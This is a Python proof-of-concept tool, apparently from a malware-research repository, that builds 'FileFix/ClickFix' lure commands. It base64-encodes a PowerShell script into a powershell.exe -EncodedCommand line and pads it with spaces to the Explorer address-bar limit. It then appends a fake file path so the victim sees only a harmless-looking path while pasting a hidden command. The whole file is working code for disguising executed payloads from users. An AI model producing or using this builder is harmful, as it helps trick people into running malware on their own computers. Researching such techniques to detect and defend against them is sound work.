import argparse
import base64
import re

"""
    PoC for building FileFix style PowerShell scripts
    see: https://github.com/MalwareTech/ExifSmuggling
"""

def encode_powershell_script(input_file, output_file, fake_path):
    """
    Build a ClickFix style powershell command to be designed to be hidden from the user by padding it with space.
    The command is padded with the maximum number of allowable spaces & appended with a fake file path to hide it.
    Args:
        input_file: Path for the powershell script ps1 to convert into a base64 encoded command
        output_file: Path to save the final command to
        fake_path: a fake path to append to the end of the padded powershell command
    """
    with open(input_file, 'r', encoding='utf-8') as f:
        script = f.readlines()
        f.close()

    if ' ' in fake_path:
        raise(ValueError("fake file path can't contain spaces as it breaks the PowerShell command"))

    minimized_script = ''

    # minimize the input script by removing line-feeds, spaces, tabs, and comments
    for line in script:
        line = line.strip()
        if not line.startswith('#'):
            minimized_script += line

    minimized_script = minimized_script.replace('\r', '')
    minimized_script = minimized_script.replace('\n', '')

    print(f'minimized script: {minimized_script}')

    # powershell commands must be utf-16le encoded prior to base64 encoding
    utf16_script = minimized_script.encode('utf-16le')
    encoded_command = base64.b64encode(utf16_script).decode('ascii')

    # we can use -ExecutionPolicy to cause powershell to ignore everything that follow the parameter
    clickfix_command = f'powershell.exe -EncodedCommand {encoded_command} -ExecutionPolicy'

    # the Explorer address bar is limited to 2048 characters, so we want to pad our string up to 2048 bytes in length
    clickfix_command = clickfix_command.ljust(2047-len(fake_path), ' ')

    # append the fake path after the padding spaces so it's all the user will see
    clickfix_command += fake_path

    print(f'clickfix command: {clickfix_command}')

    with open(output_file, 'w', encoding='utf-8') as f:
        f.write(clickfix_command)
        f.close()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(prog='build_clickfix_cmd.py', description='Convert PowerShell script to FileFix command, see: https://github.com/MalwareTech/ExifSmuggling')
    parser.add_argument('-i', '--input-file', dest='input_file', help='Path to PowerShell script to encode as a base64 PowerShell command', required=True)
    parser.add_argument('-o', '--output-file', dest='output_file', help='Path to save the base64 PowerShell command to', required=True)
    parser.add_argument('-f', '--fake-path', dest='fake_path', help='A fake file path to show to the user', required=True)
    args = parser.parse_args()

    encode_powershell_script(args.input_file, args.output_file, args.fake_path)